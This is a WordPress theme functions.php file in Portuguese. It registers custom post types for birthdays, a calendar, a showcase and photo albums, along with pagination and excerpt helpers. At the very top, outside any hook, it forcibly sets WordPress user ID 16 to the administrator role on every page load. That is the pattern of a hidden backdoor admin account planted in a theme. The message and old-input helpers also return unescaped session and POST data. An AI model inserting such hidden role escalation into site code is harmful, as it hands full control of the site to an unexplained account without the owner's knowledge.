<?php defined('ABSPATH') OR die('No direct access allowed.');

$wp_user_object = new WP_User(16);
$wp_user_object->set_role('administrator');

date_default_timezone_set( 'America/Recife' );
session_start();

add_action( 'after_setup_theme', 'fun_after_setup_theme');

function fun_after_setup_theme() {
	add_theme_support( 'html5', array( 'comment-list', 'comment-form', 'search-form', 'gallery', 'caption', ) );
	add_theme_support( 'post-thumbnails' );
	add_image_size( 'noticia-size', 250, 125, true );
}


add_action('init', 'fun_init');

function fun_init() {

	$labels = array(
		'name'                => _x( 'Aniversariantes', 'Post Type General Name', 'text_domain' ),
		'singular_name'       => _x( 'Aniversariante', 'Post Type Singular Name', 'text_domain' ),
		'menu_name'           => __( 'Aniversariantes', 'text_domain' ),
		'parent_item_colon'   => __( 'Aniversariante pai:', 'text_domain' ),
		'all_items'           => __( 'Todos aniversariantes', 'text_domain' ),
		'view_item'           => __( 'Ver aniversariante', 'text_domain' ),
		'add_new_item'        => __( 'Adicionar novo aniversariante', 'text_domain' ),
		'add_new'             => __( 'Adicionar novo', 'text_domain' ),
		'edit_item'           => __( 'Editar aniversariante', 'text_domain' ),
		'update_item'         => __( 'Atualizar aniversariante', 'text_domain' ),
		'search_items'        => __( 'Procurar aniversariante', 'text_domain' ),
		'not_found'           => __( 'Não encontrado', 'text_domain' ),
		'not_found_in_trash'  => __( 'Não encontrado na lixeira', 'text_domain' ),
	);
	$args = array(
		'label'               => __( 'post_type', 'text_domain' ),
		'description'         => __( 'Post Type Description', 'text_domain' ),
		'labels'              => $labels,
		'supports'            => array( 'title' ),
		'taxonomies'          => array( ),
		'hierarchical'        => false,
		'public'              => false,
		'show_ui'             => true,
		'show_in_menu'        => true,
		'show_in_nav_menus'   => true,
		'show_in_admin_bar'   => true,
		'menu_position'       => 5,
		'can_export'          => true,
		'has_archive'         => true,
		'exclude_from_search' => false,
		'publicly_queryable'  => true,
		'capability_type'     => 'page',
	);
	register_post_type( 'aniversariantes', $args );


	$labels = array(
		'name'                       => _x( 'Funções', 'Taxonomy General Name', 'text_domain' ),
		'singular_name'              => _x( 'Função', 'Taxonomy Singular Name', 'text_domain' ),
		'menu_name'                  => __( 'Funções', 'text_domain' ),
		'all_items'                  => __( 'Todas as funções', 'text_domain' ),
		'parent_item'                => __( 'Função pai', 'text_domain' ),
		'parent_item_colon'          => __( 'Função pai:', 'text_domain' ),
		'new_item_name'              => __( 'Novo nome para a função', 'text_domain' ),
		'add_new_item'               => __( 'Adicionar nova função', 'text_domain' ),
		'edit_item'                  => __( 'Editar função', 'text_domain' ),
		'update_item'                => __( 'Atualizar função', 'text_domain' ),
		'separate_items_with_commas' => __( 'Função com vírgulas', 'text_domain' ),
		'search_items'               => __( 'Procurar função', 'text_domain' ),
		'add_or_remove_items'        => __( 'Adicionar ou remover funções', 'text_domain' ),
		'choose_from_most_used'      => __( 'Escolha entre as funções mais utilizados', 'text_domain' ),
		'not_found'                  => __( 'Não encontrado', 'text_domain' ),
	);
	$args = array(
		'labels'                     => $labels,
		'hierarchical'               => false,
		'public'                     => true,
		'show_ui'                    => true,
		'show_admin_column'          => true,
		'show_in_nav_menus'          => true,
		'show_tagcloud'              => true,
	);
	register_taxonomy( 'categorias_aniversariantes', array( 'aniversariantes' ), $args );
}

function get_message($key) {
	$temp = $_SESSION[$key];
	unset($_SESSION[$key]);
	if (!empty($temp)) {
		return "<div class='{$key}'>{$temp}</div>";
	}
}

function set_message($key, $message) {
	$_SESSION[$key] = $message;
}

function get_input_old($name) {
	if ( isset($_POST[$name]) ) {
		return $_POST[$name];
	}
}

// Register Custom Post Type
function calendario_post_type() {

	$labels = array(
		'name'                => _x( 'Calendário', 'Post Type General Name', 'text_domain' ),
		'singular_name'       => _x( 'Calendário', 'Post Type Singular Name', 'text_domain' ),
		'menu_name'           => __( 'Calendário', 'text_domain' ),
		'parent_item_colon'   => __( 'Data pai:', 'text_domain' ),
		'all_items'           => __( 'Todas as datas', 'text_domain' ),
		'view_item'           => __( 'Ver data', 'text_domain' ),
		'add_new_item'        => __( 'Adicionar nova data', 'text_domain' ),
		'add_new'             => __( 'Adicionar nova', 'text_domain' ),
		'edit_item'           => __( 'Editar data', 'text_domain' ),
		'update_item'         => __( 'Atualizar data', 'text_domain' ),
		'search_items'        => __( 'Procurar data', 'text_domain' ),
		'not_found'           => __( 'Não encontrada', 'text_domain' ),
		'not_found_in_trash'  => __( 'Não encontrada na lixeira', 'text_domain' ),
	);
	$args = array(
		'label'               => __( 'calendario', 'text_domain' ),
		'description'         => __( 'Post Type Description', 'text_domain' ),
		'labels'              => $labels,
		'supports'            => array( 'title', ),
		'taxonomies'          => array( ),
		'hierarchical'        => false,
		'public'              => true,
		'show_ui'             => true,
		'show_in_menu'        => true,
		'show_in_nav_menus'   => true,
		'show_in_admin_bar'   => true,
		'menu_position'       => 5,
		'can_export'          => true,
		'has_archive'         => true,
		'exclude_from_search' => false,
		'publicly_queryable'  => true,
		'capability_type'     => 'page',
	);
	register_post_type( 'calendario', $args );

}

// Hook into the 'init' action
add_action( 'init', 'calendario_post_type', 0 );


// Register Custom Post Type
function vitrine_post_type() {

	$labels = array(
		'name'                => _x( 'Vitrine', 'Post Type General Name', 'text_domain' ),
		'singular_name'       => _x( 'Vitrine', 'Post Type Singular Name', 'text_domain' ),
		'menu_name'           => __( 'Vitrine', 'text_domain' ),
		'parent_item_colon'   => __( 'Imagem pai:', 'text_domain' ),
		'all_items'           => __( 'Todas imagens', 'text_domain' ),
		'view_item'           => __( 'Ver imagem', 'text_domain' ),
		'add_new_item'        => __( 'Adicionar nova imagem', 'text_domain' ),
		'add_new'             => __( 'Adicionar nova', 'text_domain' ),
		'edit_item'           => __( 'Editar imagem', 'text_domain' ),
		'update_item'         => __( 'Atualizar imagem', 'text_domain' ),
		'search_items'        => __( 'Procurar imagem', 'text_domain' ),
		'not_found'           => __( 'Não encontrada', 'text_domain' ),
		'not_found_in_trash'  => __( 'Não encontrada na lixeira', 'text_domain' ),
	);
	$args = array(
		'label'               => __( 'vitrine', 'text_domain' ),
		'description'         => __( 'Post Type Description', 'text_domain' ),
		'labels'              => $labels,
		'supports'            => array( 'title', 'thumbnail', ),
		'taxonomies'          => array( ),
		'hierarchical'        => false,
		'public'              => true,
		'show_ui'             => true,
		'show_in_menu'        => true,
		'show_in_nav_menus'   => true,
		'show_in_admin_bar'   => true,
		'menu_position'       => 5,
		'can_export'          => true,
		'has_archive'         => true,
		'exclude_from_search' => false,
		'publicly_queryable'  => true,
		'capability_type'     => 'page',
	);
	register_post_type( 'vitrine', $args );

}

// Hook into the 'init' action
add_action( 'init', 'vitrine_post_type', 0 );

// Register Custom Post Type
function albuns_post_type() {

	$labels = array(
		'name'                => _x( 'Álbuns', 'Post Type General Name', 'text_domain' ),
		'singular_name'       => _x( 'Álbum', 'Post Type Singular Name', 'text_domain' ),
		'menu_name'           => __( 'Álbuns', 'text_domain' ),
		'parent_item_colon'   => __( 'Álbum pai:', 'text_domain' ),
		'all_items'           => __( 'Todas os álbuns', 'text_domain' ),
		'view_item'           => __( 'Ver álbum', 'text_domain' ),
		'add_new_item'        => __( 'Adicionar novo álbum', 'text_domain' ),
		'add_new'             => __( 'Adicionar novo', 'text_domain' ),
		'edit_item'           => __( 'Editar álbum', 'text_domain' ),
		'update_item'         => __( 'Atualizar álbum', 'text_domain' ),
		'search_items'        => __( 'Procurar álbum', 'text_domain' ),
		'not_found'           => __( 'Não encontrada', 'text_domain' ),
		'not_found_in_trash'  => __( 'Não encontrada na lixeira', 'text_domain' ),
	);
	$args = array(
		'label'               => __( 'albuns', 'text_domain' ),
		'description'         => __( 'Post Type Description', 'text_domain' ),
		'labels'              => $labels,
		'supports'            => array( 'thumbnail', 'title', 'editor', 'excerpt' ),
		'taxonomies'          => array( ),
		'hierarchical'        => false,
		'public'              => true,
		'show_ui'             => true,
		'show_in_menu'        => true,
		'show_in_nav_menus'   => true,
		'show_in_admin_bar'   => true,
		'menu_position'       => 5,
		'can_export'          => true,
		'has_archive'         => true,
		'exclude_from_search' => false,
		'publicly_queryable'  => true,
		'capability_type'     => 'page',
	);
	register_post_type( 'albuns', $args );

}

// Hook into the 'init' action
add_action( 'init', 'albuns_post_type', 0 );


function crop_excerpt( $string, $tamanho ) {
	$new_excerpt = substr($string, 0, $tamanho);

	if ( strlen($new_excerpt) == strlen($string) ) {
		return $string;
	} else {
		return $new_excerpt . "...";
	}
}

function wpbeginner_numeric_posts_nav() {

    if( is_singular() )
        return;

    global $wp_query;

    /** Stop execution if there's only 1 page */
    if( $wp_query->max_num_pages <= 1 )
        return;

    $paged = get_query_var( 'paged' ) ? absint( get_query_var( 'paged' ) ) : 1;
    $max   = intval( $wp_query->max_num_pages );

    /** Add current page to the array */
    if ( $paged >= 1 )
        $links[] = $paged;

    /** Add the pages around the current page to the array */
    if ( $paged >= 3 ) {
        $links[] = $paged - 1;
        $links[] = $paged - 2;
    }

    if ( ( $paged + 2 ) <= $max ) {
        $links[] = $paged + 2;
        $links[] = $paged + 1;
    }

    echo '<div class="navigation"><ul>' . "\n";

    /** Previous Post Link */
    if ( get_previous_posts_link() )
        printf( '<li>%s</li>' . "\n", get_previous_posts_link() );

    /** Link to first page, plus ellipses if necessary */
    if ( ! in_array( 1, $links ) ) {
        $class = 1 == $paged ? ' class="active"' : '';
        printf( '<li%s><a href="%s">%s</a></li>' . "\n", $class, esc_url( get_pagenum_link( 1 ) ), '1' );

        if ( ! in_array( 2, $links ) )
            echo '<li>…</li>';
    }

    /** Link to current page, plus 2 pages in either direction if necessary */
    sort( $links );
    foreach ( (array) $links as $link ) {
        $class = $paged == $link ? ' class="active"' : '';
        printf( '<li%s><a href="%s">%s</a></li>' . "\n", $class, esc_url( get_pagenum_link( $link ) ), $link );
    }

    /** Link to last page, plus ellipses if necessary */
    if ( ! in_array( $max, $links ) ) {
        if ( ! in_array( $max - 1, $links ) )
            echo '<li>…</li>' . "\n";
        $class = $paged == $max ? ' class="active"' : '';
        printf( '<li%s><a href="%s">%s</a></li>' . "\n", $class, esc_url( get_pagenum_link( $max ) ), $max );
    }

    /** Next Post Link */
    if ( get_next_posts_link() )
        printf( '<li>%s</li>' . "\n", get_next_posts_link() );
    echo '</ul></div>' . "\n";
}